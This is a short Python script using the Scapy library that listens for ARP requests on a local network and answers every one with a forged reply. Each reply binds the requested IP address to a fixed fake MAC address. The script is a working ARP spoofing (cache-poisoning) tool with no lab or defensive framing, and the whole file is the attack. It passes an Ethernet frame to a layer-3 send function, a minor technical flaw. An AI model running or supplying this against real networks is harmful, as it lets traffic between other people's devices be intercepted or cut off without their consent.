# Import necessary modules from Scapy
from scapy.all import ARP, Ether, srp, send, sniff

# Function to create and send an ARP reply
def reply_arp(packet):
    if packet[ARP].op == 1:  # ARP request (who-has)
        # Construct the ARP reply
        arp_reply = ARP(op=2,                # ARP reply operation
                        hwsrc="00:0c:29:63:45:71",  # Fake source MAC address
                        psrc=packet[ARP].pdst,      # The IP we are "responding" to
                        hwdst=packet[ARP].hwsrc,    # Destination MAC address (source of the request)
                        pdst=packet[ARP].psrc)      # IP of the request source
        
        # Ethernet frame for the ARP reply
        ether = Ether(dst=packet[Ether].src, src="00:0c:29:63:45:71")
        reply_packet = ether / arp_reply
        
        # Send the ARP reply
        send(reply_packet)
        print(f"Sent ARP reply: {arp_reply.summary()}")

# Sniff ARP requests and send replies
sniff(filter="arp", prn=reply_arp, store=0)
